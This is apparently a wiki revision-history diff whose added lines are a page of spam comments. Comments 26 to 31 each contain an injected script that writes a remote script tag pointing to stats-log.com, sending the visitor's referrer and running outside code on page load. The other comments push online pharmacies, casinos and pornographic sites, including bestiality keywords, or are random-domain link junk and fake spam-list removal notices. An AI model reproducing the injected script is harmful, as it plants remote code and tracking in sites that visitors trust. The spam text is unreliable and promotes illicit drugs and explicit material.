+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[26]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[27]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[28]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[29]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[30]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[31]
+wf4jl4z-hvazctg-tw6qce63-0 <script>var r = document.referrer; document.write('<script src="http://www.stats-log.com/gb.php?id=g&r='+escape(r)+'"><' + '/script>')</script> http://worstever.net/forum/topic.asp?TOPIC_ID=236#1 
+<a href="http://www.zakazhosting.co.uk/yfm/forum/topic.asp?TOPIC_ID=246#2">online casino</a> 
+[url=http://snipurl.com/1frpp#3]phentermine online[/url] 
+[url]http://worstever.net/forum/topic.asp?TOPIC_ID=236#4[/url]
+([[viagra]] [d5s_test62@@hotmail.com])
+
+[32]
+Hello, Your site is great. Regards, Valintino Guxxi
+([[Valintino]] [valintino@@qmail.com])
+
+[33]
+Hello, I just started my blog!
+[PRE[
+ http://buy-levitra.blog.drecom.jp/ <a href=http://buy-levitra.blog.drecom.jp/ >Buy Levitra</a> [URL=http://buy-levitra.blog.drecom.jp/]levitra[/URL]
+([[Levitra]] [seodvizh@@gmail.com])
+]PRE]
+
+[34]
+nice site!
+([[norwegion cruise]] [asdasd@@asdasd.com] [WEAK[2007-06-18 19:56:38 +00:00]])
+
+[35]
+<a href=http://freewebs.com/buy-levitrarx/generic-levitra.html>buy levitra online</a>
+<a href="http://freewebs.com/buy-levitrarx/generic-levitra.html">buy levitra online</a>
+<a href='http://freewebs.com/buy-levitrarx/generic-levitra.html'>buy levitra online</a>
+[URL=http://freewebs.com/buy-levitrarx/generic-levitra.html]buy levitra online[/URL]
+http://freewebs.com/buy-levitrarx/generic-levitra.html
+([[Jenny]] [rudffgdfvb@@yahoo.com])
+
+[36]
+The mission of the your site.
+[PRE[
+ <a href=http://licia.artov.isc.cnr.it/twiki/pub/Main/ValentinoRossini/zoloft.htm > buy zoloft </a><a href=http://licia.artov.isc.cnr.it/twiki/pub/Main/ValentinoRossini/bontril.htm > buy bontril </a>  <a href=http://licia.artov.isc.cnr.it/twiki/pub/Main/ValentinoRossini/oxycodone.htm > oxycodone </a> 
+ [url=http://licia.artov.isc.cnr.it/twiki/pub/Main/ValentinoRossini/oxycodone.htm] oxycodone [/url]  [url=http://licia.artov.isc.cnr.it/twiki/pub/Main/ValentinoRossini/didrex.htm] didrex [/url] 
+([[Milos]] [AchillesJolivity61@@gawab.com])
+]PRE]
+
+[37]
+If you want do delete your site from our spam bases - just email us with domain of your site:
+
+abuse-here@@inbox.ru
+
+thank you!
+([[Alexbuy]] [alexmx@@gmail.com])
+
+[38]
+If you want do delete your site from our spam bases - just email us with domain of your site:
+
+abuse-here@@inbox.ru
+
+thank you!
+([[Alexnjf]] [alexfc@@gmail.com])
+
+[39]
+I found it very interesting.
+[PRE[
+ <a href=http://club-penguin-cheats.yuoi.biz > club penguin cheats </a>  <a href=http://naruto-hentai.yuoi.biz > naruto hentai </a> <a href=http://big-boobs.yuoi.biz > big boobs </a> 
+ [url=http://beasiality.yuoi.biz] beastiality [/url]  [url=http://club-penguin-cheats.yuoi.biz] club penguin cheats [/url] 
+([[Nicolas]] [EleniZhynolut85@@gawab.com])
+]PRE]
+
+[40]
+This is a cool site! Thanks and wish you better luck! Brilliant but simple idea.
+[PRE[
+ <a href=http://dirty-sanchez.gyty.biz > dirty sanchez </a> 
+ [url=http://teen-sluts.gyty.biz] teen sluts [/url]  [url=http://riding-dirty.gyty.biz] riding dirty [/url]  [url=http://dirty-sanchez.gyty.biz] dirty sanchez [/url] [url=http://big-booty.gyty.biz] big booty [/url] 
+([[Damianos]] [AleksiuGopkolty71@@gawab.com])
+]PRE]
+
+[42]
+<a href=http://helloworld.com >just hi</a>
+just hi http://helloworld.com just hi
+[url=http://helloworld.com ]just hi[/url]
+([[just hi]] [hi@@helloworld.com])
+
+[43]
+e0FP8v  <a href="http://cpavoazlmbrn.com/">cpavoazlmbrn</a>, [url=http://mnhvmzcpyfom.com/]mnhvmzcpyfom[/url], [link=http://grjtlxgvseyj.com/]grjtlxgvseyj[/link], http://rrmvjoofmgkk.com/
+([[pswciuhjryx]] [rxilpt@@oedyep.com] [WEAK[2008-03-21 23:06:54 +00:00]])
+
+[44]
+Graphics can sometimes bring your blog to life, 
+([[Coastie]] [alfrria@@pmail.com] [WEAK[2008-04-17 16:55:28 +00:00]])
+
+
+[45]
+Graphics can sometimes bring your blog to life, 
+([[Coastie]] [alfrria@@pmail.com] [WEAK[2008-04-17 16:55:56 +00:00]])
+
+
+[[#comment]]
+
+
+a250 9
+([[名無しさん]])
+
+[41]
+My mind is like a fog.
+I don't care.
+That's how it is.
+<a href='http://fioricetbuyfior.blog.ijijiji.com'>buying fioricet</a>
+http://fioricetbuyfior.blog.ijijiji.com
+([[order fioricet overnight]] [vujwkaer@@lycosemail.com] [WEAK[2008-01-30 23:14:57 +00:00]])@
+
+
+1.1
+log
+@converted from SuikaWiki3 <http://suika.fam.cx/gate/cvs/suikawiki/wikidata/page/436F6E74656E742D456E636F64696E67.txt>
+@
+text
+@d1 443
+a443 1
+d5IrMl  <a href="http://wgovmfippqqi.com/">wgovmfippqqi</a>, [url=http://fzhithxyepsz.com/]fzhithxyepsz[/url], [link=http://kberdsbxsdao.com/]kberdsbxsdao[/link], http://tgpnghljdvac.com/@
+
